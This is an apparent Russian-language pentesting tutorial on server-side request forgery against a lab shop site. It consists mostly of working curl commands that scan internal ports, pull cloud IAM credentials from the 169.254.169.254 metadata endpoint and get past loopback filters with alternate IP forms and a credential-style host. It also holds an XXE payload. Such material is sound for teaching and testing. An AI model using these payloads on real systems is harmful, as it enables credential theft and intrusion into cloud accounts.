## Задача

**SSRF** (Server-Side Request Forgery) — заставить **сервер** сделать запрос туда, куда мы сами не дотянемся: во внутреннюю сеть, на localhost или в облачные метаданные. Сервер довереннее нас, поэтому его запрос проходит сквозь firewall.

В этой ступени — базовый SSRF и его облачный сценарий, а также XXE как «двоюродный» SSRF-вектор.

## Наш пример: загрузка аватара по ссылке

Магазин умеет тянуть аватар по URL, который мы задаём:

```bash
$ curl -s -d 'avatar_url=https://example.com/a.png' https://shop.local/profile/avatar
{"status":"ok","saved":"a.png"}
```

Сервер сходил по нашему URL. Проверим, ходит ли он по внутренним адресам:

```bash
$ curl -s -d 'avatar_url=http://127.0.0.1:80/' https://shop.local/profile/avatar
{"status":"ok","saved":"index.html"}
```

`127.0.0.1` сработал — сервер обратился к самому себе. Это подтверждённый SSRF. Теперь используем его как «портал» во внутреннюю сеть.

## Шаг 1: SSRF как сканер портов

Сервер может обращаться к localhost на разные порты. Разница в ответе выдаёт, что там слушает:

```bash
$ for p in 22 80 3306 6379 8080; do
    curl -s -o /dev/null -w "$p: %{time_total}s\n" -d "avatar_url=http://127.0.0.1:$p/" https://shop.local/profile/avatar; done
22: 0.001s
80: 0.050s
3306: 0.002s
6379: 0.001s
8080: 0.300s
```

Порт `8080` отвечает дольше — там что-то есть (админка на внутреннем интерфейсе). Порт `6379` — Redis. Мы нашли внутренние сервисы, не имея доступа в сеть.

## Шаг 2: облачные метаданные — главная цель

В облаке у каждой VM есть служебный адрес `169.254.169.254`, где лежат временные креды и конфигурация. Для AWS:

```bash
$ curl -s -d 'avatar_url=http://169.254.169.254/latest/meta-data/iam/security-credentials/' \
  https://shop.local/profile/avatar
{"status":"ok","saved":"my-role"}

$ curl -s -d 'avatar_url=http://169.254.169.254/latest/meta-data/iam/security-credentials/my-role' \
  https://shop.local/profile/avatar
{"AccessKeyId":"ASIA...","SecretAccessKey":"...","Token":"..."}
```

Мы получили **временные креды роли IAM**. С ними можно дёргать облачный API от имени сервера. Это верхняя ступень SSRF: из «прочитать localhost» — в «получить доступ к облаку».

> **Метаданные облака** — служебный HTTP-эндпоинт (`169.254.169.254`), доступный только с самой VM. Отдаёт креды, user-data, имена ресурсов. Защищён тем, что недостижим снаружи — но SSRF ломает это допущение.

## Шаг 3: обход фильтров на внутренние адреса

Разработчики пытаются запретить `127.0.0.1`, но делают это наивно. Обходы:

```bash
$ curl -s -d 'avatar_url=http://0x7f000001/' https://shop.local/profile/avatar     # hex-IP
$ curl -s -d 'avatar_url=http://2130706433/' https://shop.local/profile/avatar      # decimal-IP
$ curl -s -d 'avatar_url=http://[::1]/' https://shop.local/profile/avatar           # IPv6 loopback
$ curl -s -d 'avatar_url=http://127.1/' https://shop.local/profile/avatar           # короткая запись
$ curl -s -d 'avatar_url=http://attacker.com@127.0.0.1/' https://shop.local/profile/avatar
```

Все пять вариантов — тот же `127.0.0.1`, но фильтр по строке их не видит. Плюс редирект: наш домен отвечает `302` на `http://127.0.0.1/`, и если сервер следует за редиректом, фильтр обойдён.

## Шаг 4: XXE как SSRF-вектор

Если приложение парсит XML, **XXE** (XML External Entity) даёт тот же эффект — заставить сервер сделать запрос. Загрузим XML с внешней сущностью:

```xml
<?xml version="1.0"?>
<!DOCTYPE r [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<r>&xxe;</r>
```

```bash
$ curl -s -d @payload.xml https://shop.local/api/import
<r>ami-id\ninstance-id\niam/</r>
```

Сервер подставил содержимое внутреннего URL в ответ — это SSRF через XXE. Тот же принцип, другой вход.

## Шаг 5: как искать SSRF

- **Параметры-URL:** `url`, `uri`, `path`, `next`, `image`, `webhook`, `callback`.
- **Проверка:** подставь `http://127.0.0.1:80/` и свой OOB-домен (Interactsh).
- **Облако:** сразу пробуй `169.254.169.254` (AWS/Azure/GCP — разные пути).
- **XML:** ищи импорт/парсинг XML и пробуй внешнюю сущность.
- **Blind:** если ответа нет, лови DNS/HTTP-callback.

## Если не сработало

- **Только HTTP, без внутренних адресов** — обходи через DNS rebinding или редирект.
- **Фильтр на `169.254`** — используй альтернативные записи IP или IPv6.
- **Только картинки** — подставь URL, отдающий `Content-Type: image/png`, но ведущий на внутренний адрес.
- **Нет ответа** — SSRF blind; подтверждай через OOB (Interactsh).

## Что мы теперь знаем

- SSRF заставляет сервер делать запросы во внутреннюю сеть и облако.
- Метаданные `169.254.169.254` отдают временные креды IAM — топовая цель.
- Фильтры обходятся альтернативными записями IP и редиректами.
- XXE — тот же SSRF через XML-парсер.

## Частые вопросы

**Чем SSRF отличается от обычного запроса?** Тем, что запрос делает **сервер**, а не ты. Он довереннее и находится во внутренней сети — поэтому доходит туда, куда ты не дотянешься.

**Почему облачные метаданные — цель номер один?** Потому что по `169.254.169.254` лежат **временные креды** роли IAM. С ними можно дёргать облачный API от имени сервера.

**Что если ответа не видно?** Это blind SSRF: подтверждай через **out-of-band** — заставь сервер обратиться к твоему домену (Interactsh).

**Все фильтры на `127.0.0.1` бесполезны?** Наивные — да (обходятся hex/decimal/IPv6). Строгие (резолв + проверка диапазона) сложнее, но и их ломает DNS rebinding.

**XXE — это тоже SSRF?** Да, если XML-парсер разрешает внешние сущности: `SYSTEM "http://..."` заставляет сервер сделать запрос.

**Как быстро проверить параметр на SSRF?** Подставь `http://127.0.0.1:80/` и свой OOB-домен. Разница в ответе/приход запроса = SSRF есть.

## Ещё один сценарий: SSRF в вебхуке

Частая точка SSRF — «проверка вебхука»: приложение шлёт тестовый запрос на заданный URL. Используем это как портал:

```bash
$ curl -s -d 'webhook=http://169.254.169.254/latest/meta-data/iam/security-credentials/' \
  https://shop.local/api/webhooks/test
{"result":"my-role"}
```

Сервер сходил по внутреннему адресу и вернул имя роли. Дальше — сама роль:

```bash
$ curl -s -d 'webhook=http://169.254.169.254/latest/meta-data/iam/security-credentials/my-role' \
  https://shop.local/api/webhooks/test
{"result":"{\"AccessKeyId\":\"ASIA...\",\"SecretAccessKey\":\"...\"}"}
```

Креды IAM у нас. Это классический сценарий: вебхук — это SSRF по определению.

## На что смотреть дальше

- **Параметры-URL.** `url`, `uri`, `webhook`, `callback`, `next`, `image`, `import`.
- **Метаданные.** `169.254.169.254` (AWS/Azure/GCP — разные пути).
- **Внутренние порты.** `localhost:6379` (Redis), `:8080` (админка), `:3306`.
- **Фильтры.** Обходи hex/decimal/IPv6-записью IP, редиректом.
- **Blind.** Нет ответа — OOB через Interactsh.
- **XXE.** Если парсится XML — внешняя сущность даёт тот же эффект.
